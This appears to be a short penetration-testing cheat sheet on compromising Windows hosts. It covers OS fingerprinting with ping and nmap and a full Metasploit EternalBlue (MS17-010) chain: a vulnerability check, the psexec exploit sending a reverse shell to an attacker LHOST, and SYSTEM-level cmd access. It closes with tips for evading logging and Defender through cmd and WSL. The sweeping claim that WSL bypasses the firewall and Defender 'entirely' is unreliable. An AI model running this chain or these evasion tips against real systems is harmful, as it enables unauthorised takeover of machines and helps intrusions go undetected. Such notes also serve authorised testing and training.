# Infiltrating Windows

## Fingerprinting

TTL ≈ 128 → Windows (Linux ≈ 64, varies across hops but never overlaps within 20 hops):

```bash
ping <TARGET>
```

OS detection + version:

```bash
sudo nmap -v -O <TARGET>
sudo nmap -v -A <TARGET>
```

Banner grab all open ports — reveals service versions, VMware daemons, IIS version, etc.:

```bash
sudo nmap -v <TARGET> --script banner.nse
```

---

## EternalBlue (MS17-010) — Full Chain

Check vulnerability before attempting exploit:

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET>
run
```

`Host is likely VULNERABLE` → proceed. Use psexec variant — more reliable than eternalblue on Server 2016:

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <TARGET>
set LHOST <LHOST>
set LPORT <LPORT>
exploit
```

Lands as `NT AUTHORITY\SYSTEM`. Drop to cmd from Meterpreter:

```
meterpreter > shell
```

`C:\Windows\system32>` = cmd.exe. `PS C:\Windows\system32>` = PowerShell.

---

## CMD vs PowerShell — Decision

cmd: older hosts (pre-Win7 = no PS), stealth (no command history logged), batch/net commands, avoid execution policy/UAC issues.

PS: cmdlets, .NET objects, cloud interaction, scripts with aliases — more capable, more logged.

> [!tip] WSL and PowerShell Core on Linux both bypass Windows Firewall and Defender network inspection entirely — traffic from WSL instances is a blind spot. If WSL is present on a target, it's a stealth execution path worth noting.